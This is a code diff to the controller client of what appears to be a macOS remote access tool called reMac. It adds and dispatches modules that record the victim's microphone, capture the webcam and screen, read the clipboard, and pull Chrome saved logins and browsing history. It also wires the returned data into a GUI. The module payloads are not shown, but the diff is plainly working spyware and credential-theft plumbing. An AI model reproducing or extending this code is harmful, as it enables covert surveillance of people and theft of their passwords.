@@ -3,15 +3,35 @@ import os
 import base64
 from apps.libs.reMac_libbase import reMac_libbase
 from apps.client.modules.mod_client_clipboard import mod_client_clipboard
+from apps.client.modules.mod_client_hello import mod_client_hello
+from apps.client.modules.mod_client_recmic import mod_client_recmic
+from apps.client.modules.mod_client_info import mod_client_info
+from apps.client.modules.mod_client_chrome_login import mod_client_chrome_login
+from apps.client.modules.mod_client_chrome_history import mod_client_chrome_history
+from apps.client.modules.mod_client_module_help import mod_client_module_help
+from apps.client.modules.mod_client_screenshot import mod_client_screenshot
+from apps.client.modules.mod_client_webcam import mod_client_webcam
 
-reMacModules = {
-    #'hw': [mod_hello.mod_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
-    'cb': [mod_client_clipboard(), 'clipboard', 'Call clipboard module', 'cb']
-}
 
 class reMac_libclient(reMac_libbase):
-    def __init__(self, selector, sock, addr, request):
+
+    reMacModules = {
+        'hw': [mod_client_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
+        'cb': [mod_client_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
+        'rm': [mod_client_recmic(), 'record microphone', 'Call record microphone module', 'rm'],
+        'mh': [mod_client_module_help(), 'Module help', 'Call module help module', 'mh'],
+        'in': [mod_client_info(), 'Module info', 'Call info module', 'in'],
+        'cl': [mod_client_chrome_login(), 'Module Chrome login', 'Call chrome login module', 'cl'],
+        'ch': [mod_client_chrome_history(), 'Module Chrome history', 'Call chrome history module', 'ch'],
+        'sc': [mod_client_screenshot(), 'Module Screenshot', 'Call screenshot module', 'sc'],
+        'wc': [mod_client_webcam(), 'Module Webcam', 'Call webcam module', 'wc']
+    }
+
+    prg = None
+
+    def __init__(self, selector, sock, addr, request, prg = None):
         reMac_libbase.__init__(self, selector, sock, addr)
+        self.prg = prg
         self.request = request
         self._recv_buffer = b""
         self._send_buffer = b""
@@ -19,6 +39,9 @@ class reMac_libclient(reMac_libbase):
         self._jsonheader_len = None
         self.jsonheader = None
         self.response = None
+
+    def try_process_respons(self, action, message):
+        return self.reMacModules[action][0].run_mod(message)
 
     def _read(self):
         try:
@@ -56,33 +79,45 @@ class reMac_libclient(reMac_libbase):
         result = json.dumps(result, indent=4, sort_keys=True)
         if action.startswith("mh")\
                 or action == "in":
-            print(content.get("result"))
+            return self.reMacModules[action.split(" ")[0]][0].run_mod(content)
+            # print(content.get("result"))
         elif action.startswith("sc"):
-            print(content.get("result"))
-            cur_dir = os.path.abspath("./tmp")
-            base64ToolContent = content.get("result")
-            base64ToolContent = base64ToolContent.encode()
-            audio_out = f"{cur_dir}/screenshot-{self.get_datetime_str()}.png"
-            with open(audio_out, "wb") as output_file:
-                output_file.write(base64.b64decode(base64ToolContent))
+            return self.reMacModules["sc"][0].run_mod(content)
+            # print(content.get("result"))
+            # cur_dir = os.path.abspath("./tmp")
+            # base64ToolContent = content.get("result")
+            # base64ToolContent = base64ToolContent.encode()
+            # audio_out = f"{cur_dir}/screenshot-{self.get_datetime_str()}.png"
+            # with open(audio_out, "wb") as output_file:
+            #     output_file.write(base64.b64decode(base64ToolContent))
         elif action.startswith("wc"):
-            print(content.get("result"))
-            cur_dir = os.path.abspath("./tmp")
-            print("CurDir: " + cur_dir)
-            base64ToolContent = content.get("result")
-            base64ToolContent = base64ToolContent.encode()
-
-            image_out = f"{cur_dir}/webcam-{self.get_datetime_str()}.png"
-            with open(image_out, "wb") as output_file:
-                output_file.write(base64.b64decode(base64ToolContent))
+            return self.reMacModules["wc"][0].run_mod(content)
+            # print(content.get("result"))
+            # cur_dir = os.path.abspath("./tmp")
+            # print("CurDir: " + cur_dir)
+            # base64ToolContent = content.get("result")
+            # base64ToolContent = base64ToolContent.encode()
+            #
+            # image_out = f"{cur_dir}/webcam-{self.get_datetime_str()}.png"
+            # with open(image_out, "wb") as output_file:
+            #     output_file.write(base64.b64decode(base64ToolContent))
         elif action.startswith("rm"):
-            print(content.get("result"))
-            cur_dir = os.path.abspath("./tmp")
-            base64ToolContent = content.get("result")
-            base64ToolContent = base64ToolContent.encode()
-            audio_out = f"{cur_dir}/recmic-{self.get_datetime_str()}.mp3"
-            with open(audio_out, "wb") as output_file:
-                output_file.write(base64.b64decode(base64ToolContent))
+            return self.reMacModules["rm"][0].run_mod(content)
+        elif action.startswith("cl"):
+            return self.reMacModules["cl"][0].run_mod(content)
+        elif action.startswith("ch"):
+            return self.reMacModules["ch"][0].run_mod(content)
+        elif action.startswith("hw"):
+            return self.reMacModules["hw"][0].run_mod(content)
+        # elif action.startswith("hw"):
+        #     return self.reMacModules["hw"][0].run_mod(content)
+            # print(content.get("result"))
+            # cur_dir = os.path.abspath("./tmp")
+            # base64ToolContent = content.get("result")
+            # base64ToolContent = base64ToolContent.encode()
+            # audio_out = f"{cur_dir}/recmic-{self.get_datetime_str()}.mp3"
+            # with open(audio_out, "wb") as output_file:
+            #     output_file.write(base64.b64decode(base64ToolContent))
         else:
             print(f"got result: {result}, action: {action}")
 
@@ -145,7 +180,7 @@ class reMac_libclient(reMac_libbase):
             encoding = self.jsonheader["content-encoding"]
             self.response = self._json_decode(data, encoding)
             print("received response", repr(self.response), "from", self.addr)
-            self._process_response_json_content()
+            self.prg.emit(self._process_response_json_content())
         else:
             # Binary or unknown content-type
             self.response = data
